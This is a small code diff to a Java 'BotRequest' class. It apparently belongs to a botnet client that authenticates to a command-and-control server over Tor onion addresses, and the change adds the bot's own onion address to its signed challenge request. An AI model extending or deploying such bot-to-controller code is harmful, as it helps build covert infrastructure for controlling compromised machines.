@@ -30,14 +30,10 @@ import cs.sii.service.crypto.CryptoUtils;
 public class BotRequest {
 
 	private static final int WAIT_RANGE = 1000;
-
 	private static final String PORT = ":8443";
-
 	private static final String HTTPS = "https://";
 	private static final String HTTP = "http://";
-
 	public final static Integer REQNUMBER = 10;
-
 	private static final int TIMEOUT_MILLIS = 600000;
 
 	@Autowired
@@ -243,7 +239,7 @@ public class BotRequest {
 	}
 
 	// da valutare se devono essere asincroni
-	public Pairs<Long, Integer> getChallengeFromCeC(String idBot, OnionAddress onionCeC) {
+	public Pairs<Long, Integer> getChallengeFromCeC(String idBot, OnionAddress onionCeC,OnionAddress myOnion) {
 		Pairs<Long, Integer> response = new Pairs<>();
 		Integer counter = 0;
 
@@ -251,7 +247,7 @@ public class BotRequest {
 		String data = null;
 		try {
 			signId = pki.signMessageRSA(idBot);
-			data = idBot + "<CS>" + signId;
+			data = idBot + "<CS>" + signId +"<CS>" + myOnion;
 		} catch (InvalidKeyException | SignatureException e1) {
 			e1.printStackTrace();
 		}
